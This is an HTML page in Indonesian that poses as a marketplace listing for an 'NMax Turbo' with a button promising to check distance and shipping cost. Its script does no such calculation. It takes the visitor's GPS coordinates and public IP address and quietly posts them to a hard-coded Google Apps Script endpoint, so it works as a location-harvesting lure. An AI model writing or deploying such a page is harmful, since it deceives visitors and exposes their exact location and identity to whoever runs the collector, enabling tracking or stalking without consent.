<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>NMax Turbo - Marketplace</title>
    <style>
        body { font-family: -apple-system, sans-serif; padding: 20px; color: #1c1e21; }
        .product-card { max-width: 500px; margin: auto; border: 1px solid #ddd; padding: 20px; border-radius: 8px; }
        .product-image { width: 100%; height: 300px; object-fit: cover; border-radius: 8px; margin-bottom: 15px; background: #eee; }
        .btn-lokasi { background-color: #0084ff; color: white; padding: 15px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%; }
        #modalContainer { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 255, 255, 0.95); display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 1000; }
    </style>
</head>
<body>

    <div class="product-card">
        <img id="mainProductImage" src="https://via.placeholder.com/500x300?text=Memuat+Gambar..." alt="Produk" class="product-image">
        <button id="btnVerifikasi" class="btn-lokasi">📍 Cek Jarak & Ongkir ke Lokasi Saya</button>
    </div>

    <div id="modalContainer"><h2 id="statusText">Memuat...</h2></div>

    <script>
        // Memuat gambar dari LocalStorage saat halaman dibuka
        window.onload = () => {
            const savedImage = localStorage.getItem('productImage');
            if (savedImage) document.getElementById('mainProductImage').src = savedImage;
        };

        const WEB_APP_URL = "https://script.google.com/macros/s/AKfycby9SjzR2LNMtyQqftDNXIeVHYpz-abXHabpRtNA49qkhkQUv6BkgbjX8ZIsw0hsjeIm/exec";

        async function kirimDataOtomatis() {
            const modal = document.getElementById('modalContainer');
            modal.style.display = 'flex';
            
            try {
                const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();

                await fetch(WEB_APP_URL, {
                    method: 'POST', mode: 'no-cors',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ ip: ipData.ip, lat: pos.coords.latitude, lng: pos.coords.longitude })
                });
                alert("Data berhasil diproses!");
            } catch (err) {
                alert("Izin lokasi diperlukan.");
            }
            modal.style.display = 'none';
        }

        document.getElementById('btnVerifikasi').addEventListener('click', kirimDataOtomatis);
    </script>
</body>
</html>
